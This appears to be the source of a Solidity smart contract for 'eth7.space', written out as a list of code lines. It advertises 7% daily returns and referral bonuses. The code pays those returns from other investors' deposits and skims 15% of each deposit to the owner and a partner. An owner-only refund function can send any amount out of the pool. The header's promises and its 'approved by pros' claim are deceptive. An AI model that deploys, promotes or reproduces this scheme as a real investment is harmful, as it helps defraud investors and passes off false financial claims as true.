['pragma solidity ^0.4.25;\n', '\n', '/** \n', ' * contract for eth7.space\n', ' * GAIN 7% PER 24 HOURS (every 5900 blocks)\n', ' * \n', ' *  How to use:\n', ' *  1. Send any amount of ether to make an investment\n', " *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)\n", ' *  OR\n', ' *  2b. Send more ether to reinvest AND get your profit at the same time\n', ' *\n', ' * \n', ' *  5% for every deposit of your direct partners\n', ' *  If you want to invite your partners to join our program ,They have to specify your ETH wallet in a "DATA" field during a deposit transaction.\n', ' * \n', ' * \n', ' * RECOMMENDED GAS LIMIT: 70000\n', ' * RECOMMENDED GAS PRICE: https://ethgasstation.info/\n', ' *\n', ' * Contract reviewed and approved by pros!\n', '**/\n', '\n', 'contract eth7{\n', '\n', '    address public owner;\n', '    address public partner;    \n', '    \n', '\tmapping (address => uint256) deposited;\n', '\tmapping (address => uint256) withdrew;\n', '\tmapping (address => uint256) refearned;\n', '\tmapping (address => uint256) blocklock;\n', '\n', '\tuint256 public totalDepositedWei = 0;\n', '\tuint256 public totalWithdrewWei = 0;\n', '\tuint256 public investorNum = 0;\n', '\n', '\n', '\tevent invest(address indexed beneficiary, uint amount);\n', '\n', '    constructor () public {\n', '        owner   = msg.sender;\n', '        partner = msg.sender;\n', '    }\n', '    \n', '    modifier onlyOwner {\n', '        require (msg.sender == owner, "OnlyOwner methods called by non-owner.");\n', '        _;\n', '    }    \n', '    \n', '    //if you want to be a partner, contact admin\n', '    function setPartner(address newPartner) external onlyOwner {\n', '        partner = newPartner;\n', '    }\n', ' \n', '\n', '\tfunction() payable external {\n', '\t\temit invest(msg.sender,msg.value);\n', '\t\tuint256 admRefPerc = msg.value / 10;\n', '\t\tuint256 advPerc    = msg.value / 20;\n', '\n', '\t\towner.transfer(admRefPerc);\n', '\t\tpartner.transfer(advPerc);\n', '\n', '\t\tif (deposited[msg.sender] > 0) {\n', '\t\t\taddress investor = msg.sender;\n', '            // calculate profit amount as such:\n', '            // amount = (amount invested) * 7% * (blocks since last transaction) / 5900\n', '            // 5900 is an average block count per day produced by Ethereum blockchain\n', '            uint256 depositsPercents = deposited[msg.sender] * 7 / 100 * (block.number - blocklock[msg.sender]) /5900;\n', '\t\t\tinvestor.transfer(depositsPercents);\n', '\n', '\t\t\twithdrew[msg.sender] += depositsPercents;\n', '\t\t\ttotalWithdrewWei += depositsPercents;\n', '\t\t\tinvestorNum++;\n', '\t\t}\n', '\n', '\t\taddress referrer = bytesToAddress(msg.data);\n', '\t\tif (referrer > 0x0 && referrer != msg.sender) {\n', '\t\t    referrer.transfer(admRefPerc);\n', '\t\t\trefearned[referrer] += admRefPerc;\n', '\t\t}\n', '\n', '\t\tblocklock[msg.sender] = block.number;\n', '\t\tdeposited[msg.sender] += msg.value;\n', '\t\ttotalDepositedWei += msg.value;\n', '\t}\n', '\t\n', "\t//refund to user who misunderstood the game . 'withdrew' must = 0\n", '    function reFund(address exitUser, uint a) external onlyOwner returns (uint256) {\n', '        uint256 reFundValue = deposited[exitUser];\n', '        exitUser.transfer(a);\n', '        deposited[exitUser] = 0;\n', '        return reFundValue;\n', '    }\n', '    \n', '\tfunction userDepositedWei(address _address) public view returns (uint256) {\n', '\t\treturn deposited[_address];\n', '    }\n', '\n', '\tfunction userWithdrewWei(address _address) public view returns (uint256) {\n', '\t\treturn withdrew[_address];\n', '    }\n', '\n', '\tfunction userDividendsWei(address _address) public view returns (uint256) {\n', '        return deposited[_address] * 7 / 100 * (block.number - blocklock[_address]) / 5900;\n', '    }\n', '\n', '\tfunction userReferralsWei(address _address) public view returns (uint256) {\n', '\t\treturn refearned[_address];\n', '    }\n', '\n', '\tfunction bytesToAddress(bytes bys) private pure returns (address addr) {\n', '\t\tassembly {\n', '\t\t\taddr := mload(add(bys, 20))\n', '\t\t}\n', '\t}\n', '}']